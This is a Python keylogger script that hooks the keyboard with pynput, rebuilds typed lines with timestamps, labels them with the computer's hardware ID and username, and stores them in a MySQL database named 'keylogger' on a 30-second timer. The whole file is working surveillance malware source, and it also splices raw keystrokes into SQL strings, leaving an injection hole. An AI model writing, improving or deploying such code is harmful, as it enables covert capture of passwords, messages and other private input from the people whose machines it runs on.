import json
import os
import pynput
import threading
import time
from uuid import getnode as get_network_id

import mysql.connector as mysql

dateFormat = "d_%d_%m_%y"  # This date format is the index in the array to sort the recorded logs by dates.
cache = []  # Where each line from the buffer will be stored.

sessionID = get_network_id()  # Getting computer ID from network card.
sessionName = os.environ.get("USERNAME") or "Unknown"  # Getting computer username from environment variables.


class MysqlConnect:

    def __init__(self):

        while True:  # Loop try connect until achieve it.
            try:
                self.dbConnection = mysql.MySQLConnection(host='localhost', port='3306', user='root', password='',
                                                          database='keylogger')  # Database connection info
                self.dbCursor = self.dbConnection.cursor()  # Query the database and work with the results
                break  # Stop loop if connection is established.
            except mysql.Error:
                print("[ MySQL ] Couldn't connect to mysql database! Retrying in 5 seconds...")
                time.sleep(5)  # Freeze the script during 5 seconds.

    def sessionLogIn(self, jlog_buffer):

        self.dbCursor.execute("SELECT * FROM keylogs WHERE sessionID = '" + str(sessionID) + "';")  # Query the table
        db_query = self.dbCursor.fetchall()  # Fetch the data

        if len(db_query) == 0:  # Check if sessionID already exist on database.

            sql = ("INSERT INTO `keylogs` ( `sessionID`, `sessionName`, `jsonLog` ) VALUES ( '" + str(
                sessionID) + "', '" + str(sessionName) + "', '" + str(jlog_buffer) + "'); ")
            print(sql)
            self.dbCursor.execute(sql)

            self.dbConnection.commit()  # Update database to effect new changes.
        else:
            print("[ MySQL ] This computer already have a session and now is connected! ( %i )" % sessionID)

            sql = ("INSERT INTO `keylogs` ( `sessionID`, `sessionName`, `jsonLog` ) VALUES ( '" + str(
                sessionID) + "', '" + str(sessionName) + "', '" + str(jlog_buffer) + "'); ")
            print(sql)

            self.dbCursor = self.dbConnection.cursor()
            self.dbCursor.execute(sql)
            self.dbConnection.commit()

    def saveCache(self):

        # Globalize variables before editing so that other functions can read it with the new values.
        global cache
        global mysqldb

        if len(cache) > 0:  # Check if cache is empty.
            try:
                self.dbCursor.execute(
                    "UPDATE 'keylogs' SET 'jsonLog' = JSON_MERGE_PRESERVE( jsonLog, '%s' ) WHERE sessionID = %i" % (
                        json.dumps({time.strftime(dateFormat): cache}),
                        sessionID))  # Concatenate in json except that what is already in the database.
                self.dbConnection.commit()  # Update database to effect new changes.
                cache = []  # After each save, cache variable be cleaned to save memory.
                print("[ MySQL ] Cache was saved successful!")
            except mysql.Error:
                mysqldb = MysqlConnect()  # Try to reconnect when connection was lost.


mysqldb = MysqlConnect()  # Establish connection to database.
mysqldb.sessionLogIn("")  # Once the connection is established, open a new session for this computer.

# Keyboard buffering and timing functions ->
buffer = ""  # Save each char in a line before save it in cache list.
specialChars = ["['´']", "['`']"]  # To detect and support characters with acute accent (fada)
bindKeys = ["Key.enter", "Key.tab", "Key.up", "Key.down"]


def keyboardBuffering(key_code):
    # Globalize variables before editing so that other functions can read it with the new values.
    global buffer
    global cache
    print("buffer called")
    if "Key." in key_code or key_code in specialChars:  # Check if the pressed key's code is a bindKey or a special char
        if key_code == "Key.space":
            buffer += " "  # Adding space to buffer when space is pressed.
        elif key_code == "Key.backspace":
            buffer = buffer[: -1]  # Remove las char from buffer when backspace is pressed.
        elif key_code in bindKeys:  # Check if bindKey is pressed.
            if len(buffer) > 0:  # Check if buffer is empty.
                cache.append([time.strftime("%H:%M:%S"), buffer])  # Save current buffer in cache.
                buffer = ""  # Clean buffer for a new line.
    else:
        buffer += key_code.replace("'", "")  # Add in buffer the pressed char.

    mysqldb.sessionLogIn(buffer)


def checkTimer():
    mysqldb.saveCache()  # Save cache in database.
    timer = threading.Timer(30, checkTimer)  # Call each 30 seconds to checkTime() function for saving!
    timer.start()  # Needed to start a new timer.


checkTimer()  # Calling for first time checkTimer function. While loop won't work with pynput key event!


def onKeyPress(key):
    keyboardBuffering(
        str(key))  # Change returned key to string before send to keyboardBuffering( ) it'll prevent errors!


with pynput.keyboard.Listener(on_press=onKeyPress) as listener:
    listener.join()
